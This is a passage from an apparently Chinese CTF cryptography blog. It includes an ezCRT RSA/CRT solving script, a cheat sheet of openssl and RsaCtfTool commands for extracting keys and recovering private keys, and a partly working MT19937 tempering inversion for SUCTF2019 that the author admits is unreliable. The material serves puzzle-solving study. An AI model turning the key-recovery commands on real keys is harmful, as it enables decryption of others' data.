<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, next_prime</span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line">d = <span class="number">4035685915436099980994650889948556572401301700215759631583373002944008951077734389446917516925581134450058777751810063</span></span><br><span class="line">nl = [<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el = [<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl = [<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">M = <span class="number">0</span></span><br><span class="line">A = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">B = [<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">ml = [<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nl:</span><br><span class="line">    N *= i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    A[i] = N // nl[i]</span><br><span class="line">    B[i] = invert(A[i], nl[i])</span><br><span class="line">    ml[i] = <span class="built_in">int</span>(<span class="built_in">pow</span>(cl[i], d, nl[i]))</span><br><span class="line">    M += ml[i]*A[i]*B[i]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(M % N))</span><br></pre></td></tr></table></figure>

<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>跑出来是这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">8b3i7a4af3fb3&#123;adcb-56a-6nd78a-gb89g-42p&#125;efd33l9d2</span><br></pre></td></tr></table></figure>

<p>我错了，马老师我是新来的，我不懂规矩<br>回看了下题目，因为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = gmpy2.next_prime(bytes_to_long(flag))</span><br></pre></td></tr></table></figure>

<p>所以知道了d就知道了flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我知道了，我被套路了，不解释<br>最后最后，还是有必要说下，对于不是很理解格的小朋友，可以这样理解：比如你有五个向量，草，还是手写吧</p>
<img alt="【2021红明谷】ezCRT-8fd251de.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-8fd251de.png" width="" height="" >
<img alt="【2021红明谷】ezCRT-48a0dabd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-48a0dabd.png" width="" height="" >
emmmm还是有点疑问，下次再问下老师了]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>一些RSA文件操作的摘记</title>
    <url>/posts/d77a51b9/</url>
    <content><![CDATA[<p>在打CTF密码学方向的过程中，会遇到一些使用私钥公钥的形式题目，除了使用在线的网站，也可以用OpenSSL工具</p>
<span id="more"></span>

<h1 id="一些RSA文件操作的摘记"><a href="#一些RSA文件操作的摘记" class="headerlink" title="一些RSA文件操作的摘记"></a>一些RSA文件操作的摘记</h1><h2 id="提取密钥"><a href="#提取密钥" class="headerlink" title="提取密钥"></a>提取密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in test.pfx -nocerts -nodes -out FILE_NAME</span><br></pre></td></tr></table></figure>

<h2 id="提取公钥"><a href="#提取公钥" class="headerlink" title="提取公钥"></a>提取公钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in FILE_NAME</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 从公钥文件中分解n和e</span></span><br><span class="line">pub_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;pubkey.pem&#x27;</span>).read())</span><br><span class="line">n = pub_key.n</span><br><span class="line">e = pub_key.e</span><br></pre></td></tr></table></figure>

<h2 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in FILE_NAME -text</span><br></pre></td></tr></table></figure>

<h2 id="提取密文"><a href="#提取密文" class="headerlink" title="提取密文"></a>提取密文</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">open</span>(<span class="string">&#x27;FILE_PATH&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>做上面这一步的时候有错误的话，记得切换到python2下</p>
<h2 id="生成私钥文件"><a href="#生成私钥文件" class="headerlink" title="生成私钥文件"></a>生成私钥文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python  rsatool.py -f PEM -o key.pem -n ××× -d ×××</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">python rsatool.py -f PEM -o key.pem -p 1 -q 1 -e 1</span><br></pre></td></tr></table></figure>

<p>这个文件我在KALI的rsatool-master下</p>
<h2 id="用私钥文件解密"><a href="#用私钥文件解密" class="headerlink" title="用私钥文件解密"></a>用私钥文件解密</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag</span><br><span class="line"></span><br><span class="line">openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag （OAEP方式）</span><br></pre></td></tr></table></figure>

<p>摘抄下来几个脚本，用到自取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span>(<span class="params">privkey, message</span>):</span></span><br><span class="line">    key = <span class="built_in">open</span>(privkey, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    <span class="comment"># n = rsakey.n</span></span><br><span class="line">    <span class="comment"># d = rsakey.d</span></span><br><span class="line">    rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">    decrypted = rsakey.decrypt(b64decode(message)) <span class="comment">#需要先进行base64解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> decrypt_RSA(<span class="string">&#x27;key.pem&#x27;</span>, flag)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">pri_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), pri_key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">rsakey = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;pri.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">rsa = PKCS1_OAEP.new(rsakey)</span><br><span class="line">msg = <span class="built_in">open</span>(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">f = rsa.decrypt(msg)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p =</span><br><span class="line">keypair.q =</span><br><span class="line">keypair.e =</span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p - <span class="number">1</span>) * (keypair.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>

<p>从la佬博客la来的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">用法一：已知公钥(自动求私钥)</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法二：已知公钥求私钥</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --private</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法三：密钥格式转换</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把PEM格式的公钥转换为n，e</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --dumpkey --key 公钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把n,e转换为PEM格式</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>关于操作的一些问题</category>
      </categories>
      <tags>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>【SUCTF2019 MT】看MT19937</title>
    <url>/posts/ca3b3eaf/</url>
    <content><![CDATA[<p>位运算的题目老不会了</p>
<img alt="[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" width="" height="">

<p>其实这篇MT19937，我的解法不是很正规，可以看我MT19937标签下的另外一篇</p>
<p>MT19937是伪随机数的生成算法，下面通过一道题目来了解什么是MT19937，以及它如何被预测</p>
<span id="more"></span>

<h1 id="SUCTF2019-MT"><a href="#SUCTF2019-MT" class="headerlink" title="[SUCTF2019] MT"></a>[SUCTF2019] MT</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>源码稍有改变，代码正规范点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span>     <span class="comment"># 高13位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span>     <span class="comment"># 低9位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span>    <span class="comment"># 低17位不变</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span>     <span class="comment"># 高19位不变</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;transformed_flag:&#x27;</span>, transformed_flag)</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br></pre></td></tr></table></figure>

<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>最关键的就是convert这个加密流程了，写了点注释，但怎么感觉像是把明文破坏了</p>
<h3 id="第一四组位运算"><a href="#第一四组位运算" class="headerlink" title="第一四组位运算"></a>第一四组位运算</h3><p>所以，我决定自己试一遍，试了第一组</p>
<p>一试不得了，我发现了，有被修复的可行性的，算法看下图</p>
<img alt="[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" width="" height="">

<p>我另外随便（后来发现不能太随便）搞了长度为4的字符来模拟一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">assert</span> y &gt; <span class="number">0</span></span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    high13 = c[<span class="number">0</span>:x]</span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    flag = <span class="string">b&#x27;abcd&#x27;</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(m)[<span class="number">2</span>:])</span><br><span class="line">    <span class="comment"># m = m ^ m &gt;&gt; 13</span></span><br><span class="line">    output = second_cal_re(m)</span><br><span class="line">    <span class="keyword">assert</span> long_to_bytes(output) == flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>测试结果没有报错，成功（虽然在后面我发现了致命的问题，根据选取字符的不同，这个逆函数的结果不一定是对的，比如<code>b&#39;1234&#39;转数字是9位，而b&#39;abcd&#39;是8位</code>，这就具有不确定性了）</p>
<p>显然第四个位运算和第一个位运算是同一类型的，用同样的方法，也可以逆回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forth_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-x</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    output = <span class="built_in">int</span>(part1+part2, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>然后我稍加合并，这两个位运算的逆过程就是这样，经过我多轮的测试，在本题应该不会出错，为了方便食用，后面我贴的都节选自最后跑出来的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<h3 id="第二三组位运算"><a href="#第二三组位运算" class="headerlink" title="第二三组位运算"></a>第二三组位运算</h3><p>然后我们再看第二和第三个位运算变化，如法炮制，大致算法参照如下</p>
<img alt="[SUCTF2019]MT 我也很异或呢-86361ff5.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-86361ff5.png" width="" height="" >

<p>大致的思路就是，最开始低9位是保持不变的，我们可以用第九位反推出13到21位，知道了13到21位，又可以推出9到12位，依次类推，整个过程是可逆的</p>
<p>实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>第三个位运算的逆过程和这个脚本一样</p>
<p>然后在实际跑的时候，我发现了一些bug，正如上面提到的，这些位数的不同导致了我这个方法的局限性，像什么，那个位移9位的那个，因为它有32位，结果会出错，还有位移13位的，主要都是位数不对带来的吧。所以这种方法明显低效，且不普适，后面也不会再花时间研究</p>
<p>但写都写了是吧，自己的思路，爬也要爬完，况且情况已经很局限了</p>
<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><p>花了操作系统实验课一半的时间，我终于改对了（不过是事先知道flag长啥样了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], 